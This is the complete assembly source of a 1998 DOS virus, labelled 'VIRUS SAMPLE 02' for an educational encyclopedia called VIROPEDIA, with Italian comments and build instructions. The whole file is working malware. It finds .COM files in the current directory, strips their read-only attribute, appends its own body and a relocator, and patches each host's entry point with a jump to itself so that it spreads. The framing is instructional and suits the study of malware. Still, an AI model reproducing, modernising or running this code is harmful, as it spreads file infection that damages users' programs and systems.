; VIRUS SAMPLE 02
; for VIROPEDIA of SoftProject
;
; DIRECT FILE INFECTOR FOR .COM (460 BYTES)

.MODEL SMALL
.CODE
ORG 100H        ; offset del virus

; per compilare usare il TURBO ASSEMBLER
;
; TASM VIRUS2.ASM
; TLINK VIRUS2 /t


;il programma e' suddiviso in 2 aree
;un'area contenente DATI, VARIABILI, BUFFER VUOTI
;e un'area contenente il CODICE ASM del virus
;
; +-----------------------+
; +  testa del programma  +--------\  JMP (salto)
; +-----------------------+        |
; +       AREA DATI       +        |
; +       . . . . .       +        |
; +       . . . . .       +        |
; +-----------------------+        |
; +       AREA CODICE     + <------/
; +       . . . . .       +
; +       . . . . .       +
; +-----------------------+
;
;
;-------------------------------------------------------------
; testa del programma
;-------------------------------------------------------------
PROGRAM_ENTRY_POINT:    JMP CODE_SECTION        ; salta a CODE_SECTION
                                                ; il virus inizia li'


;-------------------------------------------------------------
; AREA DATI
;-------------------------------------------------------------
DATA_SECTION:
blank_space DB 00                       ; spazio vuoto necessario
inf_mark    DB 0F5h                     ; marcatore d'infezione
all_com     DB "*.COM",00               ; tutti i file COM
nome_file   DB "xxxxxxxx.xxx",00        ; conterra' il nome del file
intestaz    DB 00,00,00,00              ; header del file COM
file_attrib DW ?                        ; attributo del file COM
gestore     DW ?                        ; gestore del file COM
lunghezza   DW ?                        ; lunghezza del file COM
virus_jump  DB 0E9h,00,00,245D          ; jump che punta al virus nel file
vecchio_segmento_DS dw ?
vecchio_segmento_ES dw ?
copyright   db "VIROPEDIA SAMPLE 2 - SOFTPJ'98"


;rilocatore (totale 25 bytes)
rilocatore:
PUSH    CS                      ;0E            salva il segmento di ritorno
MOV     DX,100h                 ;B80001        l'offset di ritorno e' 100h
PUSH    DX                      ;52            salva l'offset di ritorno
MOV     AX,CS                   ;8CC8          calcola la rilocazione con CS
ADD     AX,0000                 ;050000        0000 sara' sostituito
PUSH    AX                      ;50            salva il nuovo segmento
PUSH    DX                      ;52            salva l'offset 100h del virus
MOV     SI,100h                 ;BE0001        bisogna pero' prima riportare  
MOV     WORD PTR [SI],0000      ;C7040000      l'intestazione del file come
MOV     WORD PTR [SI+2],0000    ;C744020000    era in origine.
RETF                            ;CB            rilocazione!


;-------------------------------------------------------------
; AREA CODICE
;-------------------------------------------------------------
CODE_SECTION:
;inizializzazione di alcuni registri di segmento
MOV  vecchio_segmento_DS,DS     ;conserva in due variabili i registri di
MOV  vecchio_segmento_ES,ES     ;segmento DS e ES per ripristinarli alla fine

MOV  AX,CS                      ;aggiorna i registri DS e ES al nuovo
MOV  DS,AX                      ;segmento con il codice del virus, che
MOV  ES,AX                      ;e' CS (viene copiato in AX e passato)


;il virus e' ad azione diretta, quindi va a cercare
;il primo file *.COM nella directory corrente
;la funzione usata ? AH=4Eh dell'INT 21h
;in DX carichiamo l'indirizzo che punta al file da cercare
;in CX l'attributo da cercare (0000=+A e +R)
MOV AH,4Eh
MOV CX,0000
MOV DX,OFFSET all_com
INT 21h
JNC LEGGI_NOME
JMP FINE


;se viene trovato un file COM allora si procede alla
;memorizzazione del nome in una variabile (nome_file)
;il nome viene restituito dalla funzione 4Eh all'indirizzo
;della DTA+30d (80h + 30d = 9Eh)
;la DTA (data transfer area) e' una zona di memoria che
;si trova nel PSP del programma, quindi e' localizzata
;al segmento di esecuzione originale DS, offset 80h
LEGGI_NOME:
MOV SI,009Eh
MOV DI,OFFSET nome_file
MOV DS,vecchio_segmento_DS
MOV CX,12d                 ;un nome file e' 12 caratteri max.
CLD
REPNZ MOVSB                ;sposta la stringa da SI a DI
PUSH CS
POP DS

;si procede all'apertura del file
;la funzione ? AH=3Dh, AL=modalita' di apertura (00=read)
;in DX carichiamo l'indirizzo con la stringa del nome del file
MOV AX,3D00h
MOV DX,OFFSET nome_file 
INT 21h


;andiamo a leggere l'intestazione del file (4 bytes in tutto)
;usando la funzione AH=3Fh e il gestore del file ottenuto
;dall'apertura (BX contiene il gestore)
;CX=numero byte da leggere
;DX=indirizzo della variabile dove saranno memorizzati i bytes
MOV BX,AX
MOV AH,3Fh
MOV CX,4
MOV DX,OFFSET intestaz
INT 21h


;chiudiamo per il momento il file
MOV AH,3Eh
INT 21h


;andiamo a controllare se il file e' gia'
;infetto o no. Il nostro marcatore di infezione
;(infection mark) e' il codice ASCII "F5h"
;localizzato al 4 byte del file
MOV AH,[intestaz+3]
CMP AH,inf_mark
JNE COM_CONTROL
JMP FILE_SUCCESSIVO


;se il file non e' infetto dobbiamo verificare di che
;tipo e'; il nostro virus lavora sui COM, se il file
;e' un EXE allora bisogna lasciarlo stare.
;tutti i file EXE hanno la particolarita' di iniziare
;con una word speciale chiamata "MZ", se questa word c'e'
;allora il file e' di sicuro un EXE
COM_CONTROL:
MOV AX,WORD PTR [intestaz]
CMP AX,"ZM"
JNE LEGGI_ATTRIB


;se il file trovato non soddisfa i requisiti di vittima
;allora il virus passa a cercare il prossimo file
;se non ci sono piu' file il virus termina qui e restituisce
;l'esecuzione al programma originale di cui e' ospite
;(routine FINE)
FILE_SUCCESSIVO:
MOV AH,4Fh
INT 21h
JNC LEGGI_NOME
JMP FINE


;ok, il file trovato e' una vittima ideale, controlliamo se ha
;l'attributo di read-only (+R) che lo protegge
;la funzione usata e' AH=43h  AL=00 (legge attributo)
;DX=indirizzo del nome del file
LEGGI_ATTRIB:
MOV AX,4300h
MOV DX,OFFSET nome_file
INT 21h
MOV file_attrib,AX              ;memorizza attributo del file


;l'attributo normale di archivio (+A) e' 20h
;se il file non ha questo attributo gli viene
;impostato dal virus
CMP AX,0020H
JE  APRE_FILE_RW
MOV AX,4301h
MOV CX,0020h
MOV DX,OFFSET nome_file
INT 21h
JNC APRE_FILE_RW
JMP FINE


;apriamo il file in lettura/scrittura (AH=3Dh  AL=02)
APRE_FILE_RW:
MOV AX,3D02h
MOV DX,OFFSET nome_file 
INT 21h
MOV gestore,AX
JNC CALCOLA_LUNGHEZZA
JMP RESTORE_ATTRIB


;ci posizionamo alla fine del file, cosi' possiamo
;sapere quanto e' lungo
CALCOLA_LUNGHEZZA:
MOV AX,4202h
MOV BX,gestore
XOR CX,CX               ;azzera CX
XOR DX,DX               ;azzera DX
INT 21h


;verifichiamo che il file non superi il limite dei 64K
;e che non sia nemmeno troppo piccolo
;la grandezza e' memorizzata in DX:AX
CMP DX,0
JE  LIMITE_GRANDEZZA
JMP CHIUDE_FILE
LIMITE_GRANDEZZA:
CMP AX,63000d                  ;Limite superiore < 63.000 bytes
JA CHIUDE_FILE
CMP AX,200d                    ;Limite inferiore >    200 bytes
JB CHIUDE_FILE


;ci troviamo ora alla fine del file vittima, e andiamo a 
;scrivere  un rilocatore, cioe' una routine che serve ad aggiustare
;il punto di esecuzione del virus nel file. Il virus e' stato
;scritto all'indirizzo 100h, quindi puo' girare solo se viene
;eseguito a questo indirizzo. Quando viene scritto nel file,
;la sua posizione cambia di volta in volta (non sara' 100h),
;cosi' usiamo un rilocatore che serve a far eseguire il nostro
;virus sempre all'indirizzo 100h
;il programmino del rilocatore e' definito nell'area dati
;AX contiene ancora la grandezza del file
MOV lunghezza,AX

ADD AX,25d                      ;aggiunge la dimensione del rilocatore
ADD AX,10h                      ;aggiustamento decimale per far
AND AL,11110000b                ;quadrare la dimensione del file
MOV CX,4                        
MOV WORD PTR [RILOCATORE+8],AX  
SHR WORD PTR [RILOCATORE+8],CL  ;SHR con CX=4 e' una divisione per 10

MOV SI,WORD PTR [intestaz]       ;prepara la routine del rilocatore
MOV WORD PTR [RILOCATORE+17],SI  ;che ha il compito di andare a
MOV SI,WORD PTR [intestaz+2]     ;ripristinare le prime istruzioni del
MOV WORD PTR [RILOCATORE+22],SI  ;file original (in tutto 4 bytes)

MOV CX,AX                        ;calcoliamo la lunghezza effettiva
SUB CX,lunghezza                 ;del rilocatore
MOV AH,40h                       ;scriviamo il rilocatore
MOV BX,gestore
MOV DX,OFFSET rilocatore
INT 21h


;memorizziamo il punto dove verra' agganciato il virus
;dentro al file, quindi scriviamo il corpo del virus
;in coda al file (append)
;la funzione di scrittura e' AH=40h dell'INT 21h
;BX=gestore del file in uso
;CX=numero di byte da scrivere
;DX=inizio del buffer con i byte da scrivere
SCRIVE_CORPO_VIRUS:
MOV AH,40h
MOV BX,gestore
MOV CX,OFFSET (END_OFFSET-PROGRAM_ENTRY_POINT)
MOV DX,OFFSET PROGRAM_ENTRY_POINT
INT 21h


;risaliamo quindi alla testa del file
MOV AX,4200h
MOV BX,gestore
XOR CX,CX
XOR DX,DX
INT 21h


;modifichiamo la prima istruzione del file
;scrivendo un salto (JMP) che punta al virus
;la struttura del programma infetto diventa questa:
;
;               +-----------+
;               + JMP virus +-------------\
;               +-----------+             |
;        /---------> prog   +             |
;        |      +    ....   +             |
;        |      +    ....   +             |
;        |      +    ....   +             |
;        |      +-----------+             |
;        |      +   VIRUS <---------------/
;        |      +   .....   +
;        |      +   .....   +
;        |------+ RETF prog +
;               +-----------+
MOV AX,lunghezza
SUB AX,3
MOV WORD PTR [virus_jump+1],AX  ;indirizzo della JMP che punta al virus

MOV AH,40h
MOV BX,gestore
MOV CX,4
MOV DX,OFFSET virus_jump
INT 21h


;chiude il file una volta finita l'infezione
CHIUDE_FILE:
MOV AH,3Eh
MOV BX,GESTORE
INT 21h


;ripristina il vecchio attributo del file
RESTORE_ATTRIB:
MOV AX,4301h
MOV CX,file_attrib
MOV DX,OFFSET nome_file
INT 21h


;fine del virus, quando si arriva qui ripristiniamo
;le condizioni iniziali per far ripartire il programma
;vittima che ospita il virus. 
FINE:
POP DX
CMP DX,100H             ;questo controllo viene fatto per vedere
JE  RETURN_TO_PROG      ;se il virus e' il primo campione uscito dal
                        ;sorgente (capostipite, first sample)
MOV AX,4C00h            ;in questo caso il programma termina come un
INT 21H                 ;normale file DOS

RETURN_TO_PROG:                 ;se il virus invece e' in esecuzione
MOV DS,vecchio_segmento_DS      ;da un file infetto allora deve restituire
MOV ES,vecchio_segmento_ES      ;il controllo al suo "padrone"
XOR AX,AX                       ;azzera tutti i registri
XOR BX,BX                       
XOR CX,CX
XOR DX,DX
XOR SI,SI
XOR DI,DI
PUSH DX
RETF                            ;ritorno al file

END_OFFSET:
END PROGRAM_ENTRY_POINT

